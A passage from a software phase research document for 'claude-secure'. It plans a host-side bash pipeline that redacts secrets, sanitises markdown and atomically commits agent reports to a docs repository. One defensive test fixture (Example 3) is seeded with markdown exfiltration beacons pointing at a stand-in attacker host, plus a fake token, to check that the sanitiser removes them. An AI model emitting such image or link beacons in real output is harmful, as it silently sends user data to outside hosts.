**Why it happens:** Session-id is assumed unique, but bugs in the caller (Phase 26) could produce duplicates.

**How to avoid:** Trust the session-id uniqueness contract — session-id is the Claude Code `session_id` field from the JSON envelope, which is a UUID. Document in `publish_docs_bundle`'s doc-comment: "session-id MUST be unique across calls; duplicates cause the never-overwrite guard to fire (exit 1) or the INDEX.md rebase to conflict". Phase 26 generates session-id from Claude output so natural uniqueness is high. Add a test that runs two concurrent publishes with DIFFERENT session-ids and asserts both commits land on main.

**Warning signs:** CI occasional test failure "push rejected after rebase" on the RPT-05 concurrent-publish test — investigate whether session-ids collided.

### Pitfall 5: `redact_report_file` requires `.env` but spawn-time `.env` lives at `$CONFIG_DIR/profiles/$PROFILE/.env` — which may not be readable in the Stop hook context

**What goes wrong:** The Stop hook (Phase 26) may run under a different UID than the original spawn. If `$CONFIG_DIR` is `/etc/claude-secure` with 0600 perms on the `.env`, the hook can't read it. `redact_report_file` returns silently without redacting, and secrets leak to the commit.

**Why it happens:** `redact_report_file` uses `while read < "$env_file"` which silently returns 0 rows on a permission error.

**How to avoid:** Add an explicit `[ -r "$_env_file" ] || { echo "ERROR: cannot read $_env_file for redaction" >&2; return 1; }` guard in `publish_docs_bundle` before the redact loop. Fail loud if the env file is unreadable — redaction is a security invariant, not an optional step.

**Warning signs:** Phase 26 test with a non-readable .env produces a commit that contains a secret. This pitfall is Phase 24-shaped because Phase 24 ships the redact call site; Phase 26 will be the caller.

### Pitfall 6: `bundle.md` template file placed in wrong directory and not copied by `install.sh`

**What goes wrong:** Phase 16 plan 16-04 added a `install.sh` step 5c that copies `webhook/report-templates/*.md` to `/opt/claude-secure/webhook/report-templates/`. If `bundle.md` is placed somewhere else (e.g., `webhook/templates/bundle.md`), step 5c doesn't pick it up and the installed system has no canonical template.

**Why it happens:** Path confusion between `webhook/templates/` (Phase 15 prompt templates) and `webhook/report-templates/` (Phase 16 report templates).

**How to avoid:** Place `bundle.md` in `webhook/report-templates/bundle.md` (same dir as `issues-opened.md`, `issues-labeled.md`, etc.). Grep the install.sh step 5c block and verify it uses a glob (`*.md`) or explicitly names `bundle.md`. Add a post-install smoke test that asserts `/opt/claude-secure/webhook/report-templates/bundle.md` exists.

**Warning signs:** Phase 26 test fails with "bundle.md not found" in a CI environment that ran a fresh install.

### Pitfall 7: `redact_report_file` treats empty values as skip; a malformed `.env` with a blank `DOCS_REPO_TOKEN=` leaks the token later

**What goes wrong:** If the profile `.env` has `DOCS_REPO_TOKEN=` (empty value, possibly from a test fixture or a partial edit), `redact_report_file` skips it per D-15 "skip empty values". The token is then populated at runtime from some other source (e.g., an environment override), and the runtime token value is never added to the redactor's value set.

**Why it happens:** The redactor takes its secret list from the `.env` file contents at call time. If the `.env` is a stale snapshot of reality, the runtime value is not redacted.

**How to avoid:** For Phase 24, this is out of scope — it's a Phase 16 D-15 limitation already documented. Phase 24 should rely on Phase 16's existing contract: "the `.env` file is the source of truth for what values are redacted". If Phase 26 shipper uses a different env source, it must update the `.env` first. Document this assumption in `publish_docs_bundle`'s doc comment.

**Warning signs:** Integration test with a runtime-overridden token — manual testing will catch.

### Pitfall 8: `docker compose exec` context assumption — publish_docs_bundle runs on host, not in container

**What goes wrong:** A reader might assume "this is a claude-secure security product, it must run in the isolated container". They'd be wrong. `publish_docs_bundle` runs on the host, specifically because it needs access to:
1. `DOCS_REPO_TOKEN` from the host `.env` (which is filtered out of container env_file per Phase 23 BIND-02)
2. Git HTTPS push to the doc repo (which the container cannot reach through the proxy because doc-repo domains are not in the proxy whitelist)
3. The host-side `redact_report_file` + `push_with_retry` bash functions

**Why it happens:** Misreading the security model — the container isolates Claude; the publish pipeline runs above the container.

**How to avoid:** Add a prominent doc-comment at the top of `publish_docs_bundle`: "HOST-SIDE FUNCTION. Runs in host bash, not inside any container. Requires DOCS_REPO_TOKEN from host env (Phase 23 BIND-02 host-only projection)." Mirror the commenting style used in Phase 16 publish_report.

**Warning signs:** Planner writes tasks to "mount the function into the container via docker compose exec" — push back, wrong layer.

## Code Examples

Verified patterns from Phase 16/17/23 that the plan MUST mirror.

### Example 1: Complete `publish_docs_bundle` skeleton (pattern mirror)

```bash
# Source: pattern merges do_profile_init_docs (line 1348) + publish_report (line 1245)
#
# Phase 24 DOCS-02/03 + RPT-01..05: publish a rendered agent report + INDEX.md
# update as exactly one atomic git commit, through the existing secret redaction
# pipeline + markdown sanitizer.
#
# HOST-SIDE FUNCTION. Runs in host bash, not inside any container.
# Requires DOCS_REPO_TOKEN in host env (Phase 23 BIND-02 host-only projection).
#
# Args:
#   $1 = body_path          # path to rendered report body (from Phase 26 Stop hook)
#   $2 = session_id         # Claude session UUID (must be unique; duplicates = error)
#   $3 = summary_line       # one-line summary for INDEX.md (newlines are collapsed)
#   $4 = delivery_id        # optional, for commit message
#
# Returns:
#   0 on success (stdout last line = report URL if HTTPS remote, or rel path if file://)
#   1 on any failure (validation, clone, redact, sanitize, commit, push)
publish_docs_bundle() {
  local body_path="$1" session_id="$2" summary_line="$3" delivery_id="${4:-manual-$$}"

  # Precondition guards (RPT-01 section check + basic arg validation)
  [ -f "$body_path" ] || { echo "ERROR: body path missing: $body_path" >&2; return 1; }
  [ -n "$session_id" ] || { echo "ERROR: session_id required" >&2; return 1; }
  verify_bundle_sections "$body_path" || return 1

  # Profile-driven config must already be loaded (by CLI dispatch or test harness)
  [ -n "${PROFILE:-}" ] || { echo "ERROR: PROFILE not set" >&2; return 1; }
  [ -n "${DOCS_REPO:-}" ] || { echo "ERROR: profile '$PROFILE' has no docs_repo" >&2; return 1; }
  [ -n "${DOCS_REPO_TOKEN:-}" ] || { echo "ERROR: DOCS_REPO_TOKEN missing" >&2; return 1; }
  [ -n "${DOCS_PROJECT_DIR:-}" ] || { echo "ERROR: docs_project_dir missing" >&2; return 1; }

  local _env_file="$CONFIG_DIR/profiles/$PROFILE/.env"
  [ -r "$_env_file" ] || { echo "ERROR: cannot read $_env_file for redaction" >&2; return 1; }

  # Clone (mirrors publish_report lines 1261-1293 — same flags, same askpass, same scrub)
  local clone_dir pat="$DOCS_REPO_TOKEN"
  clone_dir=$(mktemp -d "${TMPDIR:-/tmp}/cs-publish-XXXXXXXX")
  _CLEANUP_FILES+=("$clone_dir")

  local askpass="$clone_dir/.askpass.sh"
  cat > "$askpass" <<'ASKPASS'
#!/bin/sh
case "$1" in
  Username*) printf 'x-access-token\n' ;;
  Password*) printf '%s\n' "$GIT_ASKPASS_PAT" ;;
esac
ASKPASS
  chmod 700 "$askpass"

  local clone_err="$clone_dir/clone.err"
  if ! LC_ALL=C GIT_ASKPASS="$askpass" GIT_ASKPASS_PAT="$pat" \
       GIT_TERMINAL_PROMPT=0 GIT_HTTP_LOW_SPEED_LIMIT=1 GIT_HTTP_LOW_SPEED_TIME=30 \
       timeout 60 \
       git -c credential.helper= -c credential.helper='' -c core.autocrlf=false \
           clone --depth 1 --branch "$DOCS_BRANCH" --quiet \
                 "$DOCS_REPO" "$clone_dir/repo" 2>"$clone_err"; then
    sed "s|${pat}|<REDACTED:DOCS_REPO_TOKEN>|g" "$clone_err" >&2
    return 1
  fi

  # Path construction + never-overwrite (DOCS-02)
  local year month day
  year=$(date -u +%Y); month=$(date -u +%m); day=$(date -u +%Y-%m-%d)
  local rel_report_path="${DOCS_PROJECT_DIR}/reports/${year}/${month}/${day}-${session_id}.md"
  local abs_report_path="$clone_dir/repo/$rel_report_path"
  if [ -e "$abs_report_path" ]; then
    echo "ERROR: report already exists at $rel_report_path — refusing to overwrite" >&2
    return 1
  fi
  mkdir -p "$(dirname "$abs_report_path")"
  cp "$body_path" "$abs_report_path"

  # INDEX.md append (DOCS-03)
  local rel_index_path="${DOCS_PROJECT_DIR}/reports/INDEX.md"
  local abs_index_path="$clone_dir/repo/$rel_index_path"
  [ -f "$abs_index_path" ] || { echo "ERROR: INDEX.md missing; run 'profile init-docs' first" >&2; return 1; }

  local ts_iso safe_summary
  ts_iso=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
  safe_summary="${summary_line//|/\\|}"
  safe_summary="${safe_summary//$'\n'/ }"
  printf '| %s | %s | %s |\n' "$ts_iso" "$session_id" "$safe_summary" >> "$abs_index_path"

  # Redact (RPT-03) THEN sanitize (RPT-04) — order matters, see Pitfall 1
  local f
  for f in "$abs_report_path" "$abs_index_path"; do
    redact_report_file "$f" "$_env_file"
    sanitize_markdown_file "$f"
  done

  # Stage + atomic commit (RPT-02)
  git -C "$clone_dir/repo" -c core.autocrlf=false add "$rel_report_path" "$rel_index_path" \
    || { echo "ERROR: git add failed" >&2; return 1; }

  # NOTE: no `diff --cached --quiet` gate — Phase 24 is not idempotent (Pitfall 3)

  local commit_msg="report: $session_id ($delivery_id)"
  local commit_err="$clone_dir/commit.err"
  if ! LC_ALL=C \
       GIT_AUTHOR_NAME="claude-secure" GIT_AUTHOR_EMAIL="claude-secure@localhost" \
       GIT_COMMITTER_NAME="claude-secure" GIT_COMMITTER_EMAIL="claude-secure@localhost" \
       git -C "$clone_dir/repo" -c core.autocrlf=false \
           commit -q -m "$commit_msg" 2>"$commit_err"; then
    sed "s|${pat}|<REDACTED:DOCS_REPO_TOKEN>|g" "$commit_err" >&2
    return 1
  fi

  # Push via Phase 17 3-attempt rebase loop (RPT-05)
  if ! push_with_retry "$clone_dir" "$DOCS_BRANCH"; then
    return 1
  fi

  # Report URL (mirrors publish_report line 1333-1335)
  local url_base="${DOCS_REPO%.git}"
  printf '%s/blob/%s/%s\n' "$url_base" "$DOCS_BRANCH" "$rel_report_path"
  return 0
}
```

**Source:** Composition of `do_profile_init_docs` (atomicity), `publish_report` (path layout + askpass + clone flags), `redact_report_file` (D-15 secret redaction), `push_with_retry` (Phase 17 concurrent-race handling).

### Example 2: Canonical bundle template (`webhook/report-templates/bundle.md`)

```markdown
# {{REPO_FULL_NAME}} — {{SESSION_ID}}

**Delivery:** `{{DELIVERY_ID}}`
**Event:** `{{EVENT_TYPE}}`
**Timestamp:** {{TIMESTAMP}}
**Status:** {{STATUS}}
**Session:** `{{SESSION_ID}}`
**Profile:** `{{PROFILE_NAME}}`
**Cost (USD):** {{COST_USD}}
**Duration (ms):** {{DURATION_MS}}

## Goal

{{GOAL}}

## Where Worked

{{WHERE_WORKED}}

## What Changed

{{WHAT_CHANGED}}

## What Failed

{{WHAT_FAILED}}

## How to Test

{{HOW_TO_TEST}}

## Future Findings

{{FUTURE_FINDINGS}}

## Error

{{ERROR_MESSAGE}}
```

**Source:** Derived from the phase spec's mandatory section list (roadmap line 138). The `{{VAR}}` tokens use the Phase 15 `render_template` substitution convention, so callers can reuse `render_template` or `render_report_template` unchanged.

### Example 3: Test fixture for the RPT-04 exfil beacon test

```bash
# Source: derived from the phase spec's explicit test requirement (roadmap line 141)
# "a test seeding ![](https://attacker.tld/?data=x) confirms the reference is removed"

cat > "$body_fixture" <<'EOF'
## Goal

Test redaction bypass via markdown exfiltration.

## Where Worked

Testing.

## What Changed

Injected beacon: ![](https://attacker.tld/?data=x)
Also: <!-- DOCS_REPO_TOKEN=ghp_should_redact -->
Also: <img src="https://attacker.tld/b.gif"/>
Also: [ref]: https://attacker.tld/ref

## What Failed

None.

## How to Test

Run publish_docs_bundle and assert none of the above strings appear in the final commit.

## Future Findings

None.
EOF

# After publish_docs_bundle, clone the bare repo and assert:
assert_absent "attacker.tld" "$clone/reports/${year}/${month}/${day}-${sess}.md"
assert_absent "attacker.tld" "$clone/reports/INDEX.md"
assert_absent "ghp_should_redact" "$clone/reports/${year}/${month}/${day}-${sess}.md"
```

### Example 4: Concurrent publish race test (RPT-05)

```bash
# Source: pattern from Phase 17 17-03 D-14.2 concurrent publish test

test_publish_bundle_concurrent_race() {
  # Setup: bare repo seeded, one init-docs run done.
  local bare="$TEST_TMPDIR/docs-bare.git"
  # ... standard test scaffolding ...

  # Render two bundles with different session-ids and different summary lines
  render_test_body > "$bundle_A"
  render_test_body > "$bundle_B"

  # Launch both publishes in parallel
  (
    PROFILE=docs-bind publish_docs_bundle "$bundle_A" "sess-AAAA" "summary A"
  ) &
  pid_A=$!
  (
    PROFILE=docs-bind publish_docs_bundle "$bundle_B" "sess-BBBB" "summary B"
  ) &
  pid_B=$!

  wait $pid_A; rc_A=$?
  wait $pid_B; rc_B=$?

  # Both must succeed
  [ "$rc_A" = "0" ] || fail "publisher A failed (rc=$rc_A)"
  [ "$rc_B" = "0" ] || fail "publisher B failed (rc=$rc_B)"

  # Clone the bare repo fresh and assert exactly 2 commits on main beyond init-docs
  git clone --quiet "$bare" "$verify_dir"
  local new_commits
  new_commits=$(git -C "$verify_dir" rev-list --count HEAD ^init-docs-tag)
  [ "$new_commits" = "2" ] || fail "expected 2 new commits, got $new_commits"

  # Assert both report files are present
  test -f "$verify_dir/projects/docs-test/reports/${year}/${month}/${day}-sess-AAAA.md" \
    || fail "report A missing"
  test -f "$verify_dir/projects/docs-test/reports/${year}/${month}/${day}-sess-BBBB.md" \
    || fail "report B missing"

  # Assert INDEX.md has both summary lines
  grep -q "summary A" "$verify_dir/projects/docs-test/reports/INDEX.md" || fail "INDEX missing A"
  grep -q "summary B" "$verify_dir/projects/docs-test/reports/INDEX.md" || fail "INDEX missing B"
}
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| N/A — Phase 24 is net-new | Multi-file bundle via ephemeral clone + redact loop + atomic commit + rebase-retry push | Phase 24 (2026-04) | First time claude-secure ships a host-side multi-file publish pipeline. Every prior phase published single files (Phase 16 `publish_report`) or single-shot bootstraps (Phase 23 `do_profile_init_docs`). |
| In-container report publishing via Claude Code WebFetch | Host-side publish through host-only PAT (Phase 23 BIND-02) | Phase 23 | `DOCS_REPO_TOKEN` is never mounted into the container; publish runs on host with host privileges. |
| `--force` push on non-fast-forward | 3-attempt `pull --rebase` + `push` retry | Phase 17 17-03 | Force-push is explicitly forbidden by RPT-05. The rebase loop preserves concurrent work, tested against a 3-way race. |
| Single-clone-per-push for each file | Single-clone-per-bundle (multiple files, one commit) | Phase 24 | Atomicity invariant. Two commits for one logical publish is a bug. |

**Deprecated/outdated:** None. This is net-new functionality; no prior Phase 24 approach exists to deprecate.

## Open Questions

1. **Should `publish_docs_bundle` accept a pre-rendered body (current assumption) or render the template inline?**
   - What we know: Phase 15/16 `render_template` + `render_report_template` already exist and work. Phase 26 Stop hook will be the caller; the spool file format is still TBD.
   - What's unclear: Whether the spool file shipped by Phase 26 will contain a rendered body or raw substitution variables.
   - Recommendation: Phase 24 accepts a pre-rendered body. Phase 26 is responsible for running `render_report_template` with the new `bundle.md` template before writing the spool file. This keeps `publish_docs_bundle` narrow — clone, redact, sanitize, commit, push — and leaves rendering in the layer that owns the envelope data.

2. **Should the summary line for INDEX.md be an input argument or derived from the report body?**
   - What we know: Phase 26 has the delivery context; deriving from the body means parsing markdown.
   - What's unclear: Whether the caller has a natural "summary" field or needs to construct one.
   - Recommendation: Take the summary as an explicit argument. Phase 26 can extract it from the `## Goal` section body or from the claude.result envelope. Keeps Phase 24 simple.

3. **Should `bundle.md` live in `webhook/report-templates/` (alongside event-keyed templates) or in a new directory?**
   - What we know: Phase 16 plan 16-04 already ships an install.sh step that copies `webhook/report-templates/*.md`.
   - What's unclear: Whether event-keyed routing (`issues-opened.md`, `push.md`) collides conceptually with a universal `bundle.md`.
   - Recommendation: Place it in `webhook/report-templates/bundle.md`. Naming is distinct from event names so there's no collision. The install.sh glob already picks it up. If a future requirement wants per-event bundle templates (`bundle-issues-opened.md`), the naming convention scales naturally.

4. **Does `publish_docs_bundle` need a CLI dispatch case now (for operator testing) or is library-only sufficient?**
   - What we know: Phase 26 is the primary caller. Testing can source the binary in library mode and call the function directly (Phase 23 23-03 test pattern).
   - What's unclear: Whether operators will want to run `claude-secure --profile X publish-bundle --body ./report.md --session-id sess-xxx` for debugging.
   - Recommendation: Ship library-only in Phase 24. Phase 26 can add a `debug publish-bundle` subcommand if it becomes useful. Keeps the public CLI surface minimal until we know we need it.

5. **Should `verify_bundle_sections` be a hard fail or a warning?**
   - What we know: RPT-01 says reports MUST use the template; a missing section means the agent produced a malformed report.
   - What's unclear: Whether "malformed report is better than no report" is a reasonable posture.
   - Recommendation: Hard fail. A malformed report is a caller bug (Phase 26 Stop hook is supposed to re-prompt Claude if the report is missing). Hard-fail surfaces the bug loudly; soft-warn hides it in audit logs. Phase 26 can decide how to handle the failure (re-prompt, log, give up). Phase 24 does not make that decision.

## Environment Availability

Covered above. Zero new dependencies. All tools verified present.

## Validation Architecture

### Test Framework
| Property | Value |
|----------|-------|
| Framework | Bash-based integration tests (`tests/test-phaseNN.sh`) — same harness as Phases 14-23 |
| Config file | None (test files are self-contained shell scripts that source `bin/claude-secure` in library mode) |
| Quick run command | `bash tests/test-phase24.sh <test_name>` |
| Full suite command | `bash tests/test-phase24.sh` (all tests) |

### Phase Requirements → Test Map
| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| DOCS-02 | Report written to `reports/YYYY/MM/<date>-<session>.md`, never overwrites | integration | `bash tests/test-phase24.sh test_bundle_path_layout` | ❌ Wave 0 |
| DOCS-02 | Second publish with same session-id fails (never-overwrite) | integration | `bash tests/test-phase24.sh test_bundle_never_overwrites` | ❌ Wave 0 |
| DOCS-03 | INDEX.md receives one-line entry per report | integration | `bash tests/test-phase24.sh test_bundle_updates_index` | ❌ Wave 0 |
| RPT-01 | 6 mandatory sections validated | unit | `bash tests/test-phase24.sh test_verify_bundle_sections` | ❌ Wave 0 |
| RPT-01 | Template file `bundle.md` installed | smoke | `bash tests/test-phase24.sh test_bundle_template_installed` | ❌ Wave 0 |
| RPT-02 | Exactly one commit for the bundle | integration | `bash tests/test-phase24.sh test_bundle_single_commit` | ❌ Wave 0 |
| RPT-02 | Failure mid-bundle → clean working tree | integration | `bash tests/test-phase24.sh test_bundle_failure_clean_tree` | ❌ Wave 0 |
| RPT-03 | Seeded secret never reaches remote | integration | `bash tests/test-phase24.sh test_bundle_redacts_secrets` | ❌ Wave 0 |
| RPT-04 | `![](https://attacker.tld/?data=x)` is removed | integration | `bash tests/test-phase24.sh test_bundle_sanitizes_external_image` | ❌ Wave 0 |
| RPT-04 | HTML comments, raw HTML removed | unit | `bash tests/test-phase24.sh test_sanitize_markdown_file` | ❌ Wave 0 |
| RPT-05 | 3-attempt rebase retry on non-fast-forward | integration | `bash tests/test-phase24.sh test_bundle_push_rebase_retry` | ❌ Wave 0 |
| RPT-05 | Two concurrent publishes → two commits on main, no lost updates | integration | `bash tests/test-phase24.sh test_bundle_concurrent_race` | ❌ Wave 0 |
| — | Regression: Phase 16 publish_report still works | regression | `bash tests/test-phase16.sh` | ✅ existing |
| — | Regression: Phase 23 do_profile_init_docs still works | regression | `bash tests/test-phase23.sh` | ✅ existing |

### Sampling Rate
- **Per task commit:** `bash tests/test-phase24.sh <task-specific-tests>` (~5-10 sec)
- **Per wave merge:** `bash tests/test-phase24.sh` + `bash tests/test-phase16.sh` + `bash tests/test-phase23.sh` (~30-60 sec)
- **Phase gate:** Full suite green before `/gsd:verify-work`: run `tests/run-tests.sh` or the equivalent multi-phase harness

### Wave 0 Gaps
- [ ] `tests/test-phase24.sh` — entire file (harness + 12 named test functions)
- [ ] `tests/fixtures/profile-24-bundle/profile.json` — fixture with docs_* fields pointing at a file:// bare repo
- [ ] `tests/fixtures/profile-24-bundle/.env` — fixture with DOCS_REPO_TOKEN=fake-phase24-bundle-token and SEEDED_SECRET=TEST_SECRET_VALUE_ABC for the redaction test
- [ ] `tests/fixtures/bundles/valid-body.md` — a rendered body with all 6 sections (positive test)
- [ ] `tests/fixtures/bundles/missing-section-body.md` — a rendered body missing `## Future Findings` (negative test for `verify_bundle_sections`)
- [ ] `tests/fixtures/bundles/exfil-body.md` — a rendered body seeded with the Example 3 attack vectors (RPT-04 test)
- [ ] `tests/fixtures/bundles/secret-body.md` — a rendered body containing `TEST_SECRET_VALUE_ABC` (RPT-03 test)
- [ ] `webhook/report-templates/bundle.md` — the canonical 6-section template (new file, ships alongside plan tests)
- [ ] Bare-repo seeding helpers in test harness (can reuse `tests/test-phase23.sh` helpers if factored into a shared `tests/lib/git-fixture.sh` — optional Wave 0 refactor)

*(Gap list assumes the planner will add a Wave 0 plan to build the scaffold before any implementation plans, matching Phase 14/15/17/23 precedent. If the planner prefers tight-coupled TDD within each implementation plan, the gap list collapses into the first task of Plan 01.)*

## Sources

### Primary (HIGH confidence)
- `bin/claude-secure` line 1039 (`redact_report_file`) — direct code inspection of the Phase 16 D-15 host-side secret redactor, awk-from-file literal substring replace. This is the reusable primitive for RPT-03.
- `bin/claude-secure` line 1174 (`push_with_retry`) — direct code inspection of the Phase 17 17-03 3-attempt rebase loop. Covers 5 rejection strings including file:// bare-repo race. This is the reusable primitive for RPT-05.
- `bin/claude-secure` line 1245 (`publish_report`) — direct code inspection of the Phase 16 single-file publish pattern (clone, askpass, path layout, PAT scrub). Structural template for Phase 24.
- `bin/claude-secure` line 1348 (`do_profile_init_docs`) — direct code inspection of the Phase 23 multi-file atomic commit pattern (clone, mkdir-p, diff-cached-quiet gate, atomic commit, push_with_retry). Structural template for Phase 24.
- `.planning/phases/23-profile-doc-repo-binding/23-02-PLAN.md` + `23-03-PLAN.md` — Phase 23 plan documents establishing BIND-01/02/03 field schema and DOCS-01 init-docs subcommand.
- `.planning/phases/23-profile-doc-repo-binding/23-RESEARCH.md` — Phase 23 research, particularly patterns 1-5 which this phase mirrors.
- `.planning/REQUIREMENTS.md` lines 222-231 — authoritative requirements DOCS-02, DOCS-03, RPT-01..05.
- `.planning/ROADMAP.md` line 137-142 — authoritative success criteria for Phase 24.
- `webhook/report-templates/issues-opened.md` — existing report template shape, source of the template variable convention (`{{ISSUE_TITLE}}`, etc.).
- `config/whitelist.json` — existing whitelist schema showing the env-var-to-placeholder mapping that the host-side redactor mirrors.

### Secondary (MEDIUM confidence)
- WebSearch: markdown sanitization approaches ([codestudy.net sed strip HTML](https://www.codestudy.net/blog/remove-replace-html-tags-in-bash/), [remark-strip-html](https://github.com/craftzdog/remark-strip-html), [remove-markdown npm](https://www.npmjs.com/package/remove-markdown)) — confirms that the `sed`-based approach is standard when dependency minimization matters; library options exist for richer Node/Python environments but are rejected by project constraints.
- WebSearch: markdown exfiltration attack vectors ([InstaTunnel markdown exfiltrator](https://medium.com/@instatunnel/the-markdown-exfiltrator-turning-ai-rendering-into-a-data-stealing-tool-0400e3893a2c), [Simon Willison markdown-exfiltration tag](https://simonwillison.net/tags/markdown-exfiltration/), [XSS in Markdown - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown)) — confirms that `![](https://attacker.tld/?data=x)` is the canonical exfiltration pattern and that stripping external image references is the standard defense. Validates RPT-04's test fixture choice.

### Tertiary (LOW confidence)
- None. All claims in this research are backed by direct code inspection of existing Phase 16/17/23 code or by the explicit phase requirements. No speculative claims.

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH — every tool already present in Phases 12-23, versions verified in Phase 23 research
- Architecture (multi-file atomic commit pattern): HIGH — direct mirror of Phase 23 `do_profile_init_docs` which is shipped and tested
- Architecture (markdown sanitizer): MEDIUM — sed-based approach is correct in concept, but the specific regex passes need unit-test verification against the test fixtures in Wave 0
- Pitfalls: HIGH — all 8 pitfalls derived from direct code inspection of the functions being reused + the explicit phase spec edge cases
- Concurrent-push race handling: HIGH — Phase 17 17-03 plan explicitly tested the 3-way race this phase references as RPT-05
- Redaction correctness: HIGH — `redact_report_file` is the shipped Phase 16 D-15 primitive, unchanged
- Template installation: MEDIUM — depends on whether install.sh step 5c uses a glob (auto-picks bundle.md) or explicit names (needs update); assumption is glob, needs verification in plan

**Research date:** 2026-04-14
**Valid until:** 2026-05-14 (30 days — Phase 16/17/23 primitives are stable, no upstream dependencies to track)
